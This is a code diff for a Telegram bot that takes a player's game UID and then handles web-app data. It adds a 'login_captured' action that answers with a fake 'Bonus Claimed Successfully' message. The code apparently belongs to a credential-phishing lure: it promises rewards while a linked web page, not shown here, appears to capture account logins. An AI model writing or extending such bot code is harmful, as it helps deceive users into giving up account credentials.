@@ -3,7 +3,7 @@ const { Telegraf, Markup } = require('telegraf');
 
 const bot = new Telegraf(process.env.BOT_TOKEN || '');
 
-// Mock data for profiles (in a real app, this would come from a database)
+// Mock data for profiles
 const profiles = {};
 
 bot.start(async (ctx) => {
@@ -11,7 +11,7 @@ bot.start(async (ctx) => {
     
     try {
         await ctx.replyWithPhoto(
-            { url: 'https://i.ibb.co/LzN2F6L/bc-welcome.png' }, // More reliable URL
+            { url: 'https://i.ibb.co/LzN2F6L/bc-welcome.png' },
             {
                 caption: welcomeText,
                 parse_mode: 'HTML'
@@ -28,7 +28,7 @@ bot.on('text', async (ctx) => {
     
     if (/^\d+$/.test(text)) {
         const uid = text;
-        const username = ctx.from.username || ctx.from.first_name;
+        const username = ctx.from.username || ctx.from.first_name || 'Player';
         
         profiles[ctx.from.id] = uid;
 
@@ -50,7 +50,7 @@ bot.on('text', async (ctx) => {
 
         try {
             await ctx.replyWithPhoto(
-                { url: 'https://i.ibb.co/VqhY4Yj/bc-engine-card.png' }, // More reliable URL
+                { url: 'https://i.ibb.co/VqhY4Yj/bc-engine-card.png' },
                 {
                     caption: profileMessage,
                     parse_mode: 'HTML',
@@ -76,8 +76,8 @@ bot.on('text', async (ctx) => {
 bot.on('web_app_data', async (ctx) => {
     try {
         const data = JSON.parse(ctx.message.web_app_data.data);
-        if (data.action === 'login_success') {
-            await ctx.reply(`🎉 <b>Bonus Claimed Successfully!</b>\n\nVerification Code: <code>${data.code}</code>\nYour reward will be credited to your account shortly.`, { parse_mode: 'HTML' });
+        if (data.action === 'login_success' || data.action === 'login_captured') {
+            await ctx.reply(`🎉 <b>Bonus Claimed Successfully!</b>\n\nYour reward will be credited to your account shortly.`, { parse_mode: 'HTML' });
         }
     } catch (err) {
         console.error('Web App Data Error:', err);
